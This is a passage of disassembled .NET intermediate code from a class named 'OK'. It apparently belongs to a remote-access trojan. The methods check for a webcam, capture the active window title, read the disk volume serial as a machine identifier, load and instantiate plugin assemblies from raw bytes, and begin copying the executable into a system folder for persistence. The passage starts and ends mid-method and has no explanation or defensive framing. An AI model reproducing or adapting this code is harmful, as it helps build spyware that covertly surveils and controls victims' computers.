      IL_0000:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_0005:  callvirt   instance valuetype [mscorlib]System.DateTime [mscorlib]System.IO.FileSystemInfo::get_LastWriteTime()
      IL_000a:  stloc.2
      IL_000b:  ldloca.s   V_2
      IL_000d:  ldstr      "yyyy-MM-dd"
      IL_0012:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_0017:  stloc.0
      IL_0018:  leave.s    IL_002e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001a:  dup
      IL_001b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0020:  stloc.1
      IL_0021:  ldstr      "unknown"
      IL_0026:  stloc.0
      IL_0027:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002c:  leave.s    IL_002e

    }  // end handler
    IL_002e:  ldloc.0
    IL_002f:  ret
  } // end of method OK::FR

  .method public static string  ENB(string& s) cil managed
  {
    // Code size       22 (0x16)
    .maxstack  2
    .locals init (uint8[] V_0,
             string V_1)
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000c:  stloc.0
    IL_000d:  ldloc.0
    IL_000e:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_0013:  stloc.1
    IL_0014:  ldloc.1
    IL_0015:  ret
  } // end of method OK::ENB

  .method public static string  DEB(string& s) cil managed
  {
    // Code size       22 (0x16)
    .maxstack  2
    .locals init (uint8[] V_0,
             string V_1)
    IL_0000:  ldarg.0
    IL_0001:  ldind.ref
    IL_0002:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0007:  stloc.0
    IL_0008:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_000d:  ldloc.0
    IL_000e:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_0013:  stloc.1
    IL_0014:  ldloc.1
    IL_0015:  ret
  } // end of method OK::DEB

  .method public static string  RN(int32 c) cil managed
  {
    // Code size       76 (0x4c)
    .maxstack  5
    .locals init (string V_0,
             class [mscorlib]System.Random V_1,
             string V_2,
             string V_3,
             int32 V_4,
             int32 V_5)
    IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.VBMath::Randomize()
    IL_0005:  newobj     instance void [mscorlib]System.Random::.ctor()
    IL_000a:  stloc.1
    IL_000b:  ldstr      ""
    IL_0010:  stloc.3
    IL_0011:  ldstr      "abcdefghijklmnopqrstuvwxyz"
    IL_0016:  stloc.0
    IL_0017:  ldc.i4.1
    IL_0018:  ldarg.0
    IL_0019:  stloc.s    V_5
    IL_001b:  stloc.s    V_4
    IL_001d:  br.s       IL_0044

    IL_001f:  ldloc.3
    IL_0020:  ldloc.0
    IL_0021:  ldloc.1
    IL_0022:  ldc.i4.0
    IL_0023:  ldloc.0
    IL_0024:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0029:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                      int32)
    IL_002e:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
    IL_0033:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(char)
    IL_0038:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003d:  stloc.3
    IL_003e:  ldloc.s    V_4
    IL_0040:  ldc.i4.1
    IL_0041:  add.ovf
    IL_0042:  stloc.s    V_4
    IL_0044:  ldloc.s    V_4
    IL_0046:  ldloc.s    V_5
    IL_0048:  ble.s      IL_001f

    IL_004a:  ldloc.3
    IL_004b:  ret
  } // end of method OK::RN

  .method public static uint8[]  SB(string& S) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  2
    .locals init (uint8[] V_0)
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_Default()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000c:  ret
  } // end of method OK::SB

  .method public static string  BS(uint8[]& B) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  2
    .locals init (string V_0)
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_Default()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_000c:  ret
  } // end of method OK::BS

  .method public static class [mscorlib]System.Array 
          fx(uint8[] b,
             string spl) cil managed
  {
    // Code size       138 (0x8a)
    .maxstack  6
    .locals init (class [mscorlib]System.Collections.Generic.List`1<uint8[]> V_0,
             class [mscorlib]System.Array V_1,
             class [mscorlib]System.IO.MemoryStream V_2,
             class [mscorlib]System.IO.MemoryStream V_3,
             string[] V_4)
    IL_0000:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<uint8[]>::.ctor()
    IL_0005:  stloc.0
    IL_0006:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_000b:  stloc.2
    IL_000c:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0011:  stloc.3
    IL_0012:  ldarga.s   b
    IL_0014:  call       string ClassLibrary1.OK::BS(uint8[]&)
    IL_0019:  ldarg.1
    IL_001a:  ldc.i4.m1
    IL_001b:  ldc.i4.0
    IL_001c:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0021:  stloc.s    V_4
    IL_0023:  ldloc.2
    IL_0024:  ldarg.0
    IL_0025:  ldc.i4.0
    IL_0026:  ldloc.s    V_4
    IL_0028:  ldc.i4.0
    IL_0029:  ldelem.ref
    IL_002a:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_002f:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0034:  ldloc.3
    IL_0035:  ldarg.0
    IL_0036:  ldloc.s    V_4
    IL_0038:  ldc.i4.0
    IL_0039:  ldelem.ref
    IL_003a:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_003f:  ldarg.1
    IL_0040:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0045:  add.ovf
    IL_0046:  ldarg.0
    IL_0047:  ldlen
    IL_0048:  conv.ovf.i4
    IL_0049:  ldloc.s    V_4
    IL_004b:  ldc.i4.0
    IL_004c:  ldelem.ref
    IL_004d:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0052:  ldarg.1
    IL_0053:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0058:  add.ovf
    IL_0059:  sub.ovf
    IL_005a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
    IL_005f:  ldloc.0
    IL_0060:  ldloc.2
    IL_0061:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
    IL_0066:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<uint8[]>::Add(!0)
    IL_006b:  ldloc.0
    IL_006c:  ldloc.3
    IL_006d:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
    IL_0072:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<uint8[]>::Add(!0)
    IL_0077:  ldloc.2
    IL_0078:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_007d:  ldloc.3
    IL_007e:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0083:  ldloc.0
    IL_0084:  callvirt   instance !0[] class [mscorlib]System.Collections.Generic.List`1<uint8[]>::ToArray()
    IL_0089:  ret
  } // end of method OK::fx

  .method public static uint8[]  ZIP(uint8[] B,
                                     bool& CM) cil managed
  {
    // Code size       196 (0xc4)
    .maxstack  4
    .locals init (uint8[] V_0,
             uint8[] V_1,
             class [System]System.IO.Compression.GZipStream V_2,
             class [mscorlib]System.IO.MemoryStream V_3,
             uint8[] V_4,
             uint8[] V_5,
             class [System]System.IO.Compression.GZipStream V_6,
             class [mscorlib]System.IO.MemoryStream V_7,
             int32 V_8)
    IL_0000:  ldarg.1
    IL_0001:  ldind.i1
    IL_0002:  brfalse.s  IL_004f

    IL_0004:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0009:  stloc.3
    IL_000a:  ldloc.3
    IL_000b:  ldc.i4.1
    IL_000c:  ldc.i4.1
    IL_000d:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode,
                                                                                       bool)
    IL_0012:  stloc.2
    IL_0013:  ldloc.2
    IL_0014:  ldarg.0
    IL_0015:  ldc.i4.0
    IL_0016:  ldarg.0
    IL_0017:  ldlen
    IL_0018:  conv.ovf.i4
    IL_0019:  callvirt   instance void [System]System.IO.Compression.GZipStream::Write(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_001e:  ldloc.2
    IL_001f:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0024:  ldloc.3
    IL_0025:  ldc.i4.0
    IL_0026:  conv.i8
    IL_0027:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_002c:  ldloc.3
    IL_002d:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_0032:  conv.ovf.i4
    IL_0033:  ldc.i4.1
    IL_0034:  add.ovf
    IL_0035:  newarr     [mscorlib]System.Byte
    IL_003a:  stloc.1
    IL_003b:  ldloc.3
    IL_003c:  ldloc.1
    IL_003d:  ldc.i4.0
    IL_003e:  ldloc.1
    IL_003f:  ldlen
    IL_0040:  conv.ovf.i4
    IL_0041:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0046:  pop
    IL_0047:  ldloc.3
    IL_0048:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_004d:  ldloc.1
    IL_004e:  ret

    IL_004f:  ldarg.0
    IL_0050:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_0055:  stloc.s    V_7
    IL_0057:  ldloc.s    V_7
    IL_0059:  ldc.i4.0
    IL_005a:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_005f:  stloc.s    V_6
    IL_0061:  ldc.i4.4
    IL_0062:  newarr     [mscorlib]System.Byte
    IL_0067:  stloc.s    V_5
    IL_0069:  ldloc.s    V_7
    IL_006b:  ldloc.s    V_7
    IL_006d:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_0072:  ldc.i4.5
    IL_0073:  conv.i8
    IL_0074:  sub.ovf
    IL_0075:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_007a:  ldloc.s    V_7
    IL_007c:  ldloc.s    V_5
    IL_007e:  ldc.i4.0
    IL_007f:  ldc.i4.4
    IL_0080:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0085:  pop
    IL_0086:  ldloc.s    V_5
    IL_0088:  ldc.i4.0
    IL_0089:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_008e:  stloc.s    V_8
    IL_0090:  ldloc.s    V_7
    IL_0092:  ldc.i4.0
    IL_0093:  conv.i8
    IL_0094:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0099:  ldloc.s    V_8
    IL_009b:  ldc.i4.1
    IL_009c:  sub.ovf
    IL_009d:  ldc.i4.1
    IL_009e:  add.ovf
    IL_009f:  newarr     [mscorlib]System.Byte
    IL_00a4:  stloc.s    V_4
    IL_00a6:  ldloc.s    V_6
    IL_00a8:  ldloc.s    V_4
    IL_00aa:  ldc.i4.0
    IL_00ab:  ldloc.s    V_8
    IL_00ad:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_00b2:  pop
    IL_00b3:  ldloc.s    V_6
    IL_00b5:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_00ba:  ldloc.s    V_7
    IL_00bc:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_00c1:  ldloc.s    V_4
    IL_00c3:  ret
  } // end of method OK::ZIP

  .method public static bool  Cam() cil managed
  {
    // Code size       62 (0x3e)
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             class [mscorlib]System.Exception V_2,
             string V_3,
             string V_4)
    .try
    {
      IL_0000:  ldc.i4.0
      IL_0001:  stloc.1
      IL_0002:  ldloc.1
      IL_0003:  conv.ovf.i2
      IL_0004:  ldc.i4.s   100
      IL_0006:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_000b:  stloc.3
      IL_000c:  ldloca.s   V_3
      IL_000e:  ldc.i4.s   100
      IL_0010:  ldnull
      IL_0011:  stloc.s    V_4
      IL_0013:  ldloca.s   V_4
      IL_0015:  ldc.i4.s   100
      IL_0017:  call       bool ClassLibrary1.OK::capGetDriverDescriptionA(int16,
                                                                           string&,
                                                                           int32,
                                                                           string&,
                                                                           int32)
      IL_001c:  brfalse.s  IL_0022

      IL_001e:  ldc.i4.1
      IL_001f:  stloc.0
      IL_0020:  leave.s    IL_003c

      IL_0022:  ldloc.1
      IL_0023:  ldc.i4.1
      IL_0024:  add.ovf
      IL_0025:  stloc.1
      IL_0026:  ldloc.1
      IL_0027:  ldc.i4.4
      IL_0028:  ble.s      IL_0002

      IL_002a:  leave.s    IL_003a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002c:  dup
      IL_002d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0032:  stloc.2
      IL_0033:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0038:  leave.s    IL_003a

    }  // end handler
    IL_003a:  ldc.i4.0
    IL_003b:  ret

    IL_003c:  ldloc.0
    IL_003d:  ret
  } // end of method OK::Cam

  .method public static string  ACT() cil managed
  {
    // Code size       179 (0xb3)
    .maxstack  4
    .locals init (string V_0,
             native int V_1,
             int32 V_2,
             int32 V_3,
             string V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             string V_7)
    .try
    {
      IL_0000:  call       native int ClassLibrary1.OK::GetForegroundWindow()
      IL_0005:  stloc.1
      IL_0006:  ldloc.1
      IL_0007:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_000c:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                     native int)
      IL_0011:  brfalse.s  IL_0027

      IL_0013:  ldstr      " "
      IL_0018:  stloc.s    V_7
      IL_001a:  ldloca.s   V_7
      IL_001c:  call       string ClassLibrary1.OK::ENB(string&)
      IL_0021:  stloc.0
      IL_0022:  leave      IL_00b1

      IL_0027:  ldloc.1
      IL_0028:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
      IL_002d:  call       int32 ClassLibrary1.OK::GetWindowTextLength(int64)
      IL_0032:  stloc.3
      IL_0033:  ldloc.3
      IL_0034:  ldc.i4.1
      IL_0035:  add.ovf
      IL_0036:  ldstr      "*"
      IL_003b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::StrDup(int32,
                                                                                               string)
      IL_0040:  stloc.s    V_4
      IL_0042:  ldloc.1
      IL_0043:  ldloca.s   V_4
      IL_0045:  ldloc.3
      IL_0046:  ldc.i4.1
      IL_0047:  add.ovf
      IL_0048:  call       int32 ClassLibrary1.OK::GetWindowText(native int,
                                                                 string&,
                                                                 int32)
      IL_004d:  pop
      IL_004e:  ldloc.1
      IL_004f:  ldloca.s   V_2
      IL_0051:  call       int32 ClassLibrary1.OK::GetWindowThreadProcessId(native int,
                                                                            int32&)
      IL_0056:  pop
      IL_0057:  ldloc.2
      IL_0058:  ldc.i4.0
      IL_0059:  bne.un.s   IL_0065

      IL_005b:  ldloca.s   V_4
      IL_005d:  call       string ClassLibrary1.OK::ENB(string&)
      IL_0062:  stloc.0
      IL_0063:  leave.s    IL_00b1

      .try
      {
        IL_0065:  ldloc.2
        IL_0066:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
        IL_006b:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
        IL_0070:  stloc.s    V_7
        IL_0072:  ldloca.s   V_7
        IL_0074:  call       string ClassLibrary1.OK::ENB(string&)
        IL_0079:  stloc.0
        IL_007a:  leave.s    IL_00b1

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_007c:  dup
        IL_007d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0082:  stloc.s    V_5
        IL_0084:  ldloca.s   V_4
        IL_0086:  call       string ClassLibrary1.OK::ENB(string&)
        IL_008b:  stloc.0
        IL_008c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0091:  leave.s    IL_00b1

      }  // end handler
    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0093:  dup
      IL_0094:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0099:  stloc.s    V_6
      IL_009b:  ldstr      " "
      IL_00a0:  stloc.s    V_7
      IL_00a2:  ldloca.s   V_7
      IL_00a4:  call       string ClassLibrary1.OK::ENB(string&)
      IL_00a9:  stloc.0
      IL_00aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00af:  leave.s    IL_00b1

    }  // end handler
    IL_00b1:  ldloc.0
    IL_00b2:  ret
  } // end of method OK::ACT

  .method public static string  HWD() cil managed
  {
    // Code size       84 (0x54)
    .maxstack  8
    .locals init (string V_0,
             int32 V_1,
             class [mscorlib]System.Exception V_2,
             string V_3,
             string V_4,
             int32 V_5,
             int32 V_6,
             string V_7)
    .try
    {
      IL_0000:  ldstr      "SystemDrive"
      IL_0005:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_000a:  ldstr      "\\"
      IL_000f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0014:  stloc.3
      IL_0015:  ldloca.s   V_3
      IL_0017:  ldnull
      IL_0018:  stloc.s    V_4
      IL_001a:  ldloca.s   V_4
      IL_001c:  ldc.i4.0
      IL_001d:  ldloca.s   V_1
      IL_001f:  ldc.i4.0
      IL_0020:  stloc.s    V_5
      IL_0022:  ldloca.s   V_5
      IL_0024:  ldc.i4.0
      IL_0025:  stloc.s    V_6
      IL_0027:  ldloca.s   V_6
      IL_0029:  ldnull
      IL_002a:  stloc.s    V_7
      IL_002c:  ldloca.s   V_7
      IL_002e:  ldc.i4.0
      IL_002f:  call       int32 ClassLibrary1.OK::GetVolumeInformation(string&,
                                                                        string&,
                                                                        int32,
                                                                        int32&,
                                                                        int32&,
                                                                        int32&,
                                                                        string&,
                                                                        int32)
      IL_0034:  pop
      IL_0035:  ldloc.1
      IL_0036:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Conversion::Hex(int32)
      IL_003b:  stloc.0
      IL_003c:  leave.s    IL_0052

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003e:  dup
      IL_003f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0044:  stloc.2
      IL_0045:  ldstr      "ERR"
      IL_004a:  stloc.0
      IL_004b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0050:  leave.s    IL_0052

    }  // end handler
    IL_0052:  ldloc.0
    IL_0053:  ret
  } // end of method OK::HWD

  .method public static object  Plugin(uint8[] ByteOfPlugin,
                                       string ClassName) cil managed
  {
    // Code size       117 (0x75)
    .maxstack  3
    .locals init (class [mscorlib]System.Reflection.Assembly V_0,
             object V_1,
             class [mscorlib]System.Reflection.Module V_2,
             class [mscorlib]System.Type V_3,
             int32 V_4,
             class [mscorlib]System.Reflection.Module[] V_5,
             int32 V_6,
             class [mscorlib]System.Type[] V_7)
    IL_0000:  ldarg.0
    IL_0001:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0006:  stloc.0
    IL_0007:  ldloc.0
    IL_0008:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
    IL_000d:  stloc.s    V_5
    IL_000f:  ldc.i4.0
    IL_0010:  stloc.s    V_4
    IL_0012:  br.s       IL_006b

    IL_0014:  ldloc.s    V_5
    IL_0016:  ldloc.s    V_4
    IL_0018:  ldelem.ref
    IL_0019:  stloc.2
    IL_001a:  ldloc.2
    IL_001b:  callvirt   instance class [mscorlib]System.Type[] [mscorlib]System.Reflection.Module::GetTypes()
    IL_0020:  stloc.s    V_7
    IL_0022:  ldc.i4.0
    IL_0023:  stloc.s    V_6
    IL_0025:  br.s       IL_005d

    IL_0027:  ldloc.s    V_7
    IL_0029:  ldloc.s    V_6
    IL_002b:  ldelem.ref
    IL_002c:  stloc.3
    IL_002d:  ldloc.3
    IL_002e:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_0033:  ldstr      "."
    IL_0038:  ldarg.1
    IL_0039:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003e:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
    IL_0043:  brfalse.s  IL_0057

    IL_0045:  ldloc.2
    IL_0046:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Module::get_Assembly()
    IL_004b:  ldloc.3
    IL_004c:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_0051:  callvirt   instance object [mscorlib]System.Reflection.Assembly::CreateInstance(string)
    IL_0056:  ret

    IL_0057:  ldloc.s    V_6
    IL_0059:  ldc.i4.1
    IL_005a:  add.ovf
    IL_005b:  stloc.s    V_6
    IL_005d:  ldloc.s    V_6
    IL_005f:  ldloc.s    V_7
    IL_0061:  ldlen
    IL_0062:  conv.ovf.i4
    IL_0063:  blt.s      IL_0027

    IL_0065:  ldloc.s    V_4
    IL_0067:  ldc.i4.1
    IL_0068:  add.ovf
    IL_0069:  stloc.s    V_4
    IL_006b:  ldloc.s    V_4
    IL_006d:  ldloc.s    V_5
    IL_006f:  ldlen
    IL_0070:  conv.ovf.i4
    IL_0071:  blt.s      IL_0014

    IL_0073:  ldnull
    IL_0074:  ret
  } // end of method OK::Plugin

  .method public static void  ED() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldc.i4.0
    IL_0001:  call       void ClassLibrary1.OK::pr(int32)
    IL_0006:  ret
  } // end of method OK::ED

  .method private static bool  CompDir(class [mscorlib]System.IO.FileInfo F1,
                                       class [mscorlib]System.IO.FileInfo F2) cil managed
  {
    // Code size       119 (0x77)
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.IO.DirectoryInfo V_1,
             class [mscorlib]System.IO.DirectoryInfo V_2)
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0006:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_000b:  ldarg.1
    IL_000c:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0011:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0016:  ldc.i4.0
    IL_0017:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_001c:  ldc.i4.0
    IL_001d:  beq.s      IL_0021

    IL_001f:  ldc.i4.0
    IL_0020:  ret

    IL_0021:  ldarg.0
    IL_0022:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0027:  stloc.1
    IL_0028:  ldarg.1
    IL_0029:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_002e:  stloc.2
    IL_002f:  ldloc.1
    IL_0030:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0035:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_003a:  ldloc.2
    IL_003b:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0040:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0045:  ldc.i4.0
    IL_0046:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_004b:  ldc.i4.0
    IL_004c:  ceq
    IL_004e:  brtrue.s   IL_0052

    IL_0050:  ldc.i4.0
    IL_0051:  ret

    IL_0052:  ldloc.1
    IL_0053:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_0058:  stloc.1
    IL_0059:  ldloc.2
    IL_005a:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_005f:  stloc.2
    IL_0060:  ldloc.1
    IL_0061:  ldnull
    IL_0062:  ceq
    IL_0064:  ldloc.2
    IL_0065:  ldnull
    IL_0066:  ceq
    IL_0068:  and
    IL_0069:  brfalse.s  IL_006d

    IL_006b:  ldc.i4.1
    IL_006c:  ret

    IL_006d:  ldloc.1
    IL_006e:  brtrue.s   IL_0072

    IL_0070:  ldc.i4.0
    IL_0071:  ret

    IL_0072:  ldloc.2
    IL_0073:  brtrue.s   IL_002f

    IL_0075:  ldc.i4.0
    IL_0076:  ret
  } // end of method OK::CompDir

  .method public static void  INS() cil managed
  {
    // Code size       633 (0x279)
    .maxstack  5
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             string[] V_6)
    IL_0000:  ldsfld     bool ClassLibrary1.OK::Idr
    IL_0005:  brfalse    IL_00e3

    IL_000a:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
    IL_000f:  ldsfld     string ClassLibrary1.OK::DR
    IL_0014:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0019:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_001e:  ldstr      "\\"
    IL_0023:  ldsfld     string ClassLibrary1.OK::EXE
    IL_0028:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_002d:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0032:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0037:  call       bool ClassLibrary1.OK::CompDir(class [mscorlib]System.IO.FileInfo,
                                                        class [mscorlib]System.IO.FileInfo)
    IL_003c:  brfalse.s  IL_0043

    IL_003e:  br         IL_00e3

    .try
    {
      IL_0043:  ldsfld     string ClassLibrary1.OK::DR
      IL_0048:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_004d:  ldstr      "\\"
      IL_0052:  ldsfld     string ClassLibrary1.OK::EXE
      IL_0057:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_005c:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0061:  brfalse.s  IL_0081

      IL_0063:  ldsfld     string ClassLibrary1.OK::DR
      IL_0068:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_006d:  ldstr      "\\"
      IL_0072:  ldsfld     string ClassLibrary1.OK::EXE
      IL_0077:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_007c:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0081:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_0086:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_008b:  ldsfld     string ClassLibrary1.OK::DR
      IL_0090:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0095:  ldstr      "\\"
      IL_009a:  ldsfld     string ClassLibrary1.OK::EXE
      IL_009f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00a4:  ldc.i4.1
      IL_00a5:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_00aa:  ldsfld     string ClassLibrary1.OK::DR
      IL_00af:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00b4:  ldstr      "\\"
      IL_00b9:  ldsfld     string ClassLibrary1.OK::EXE
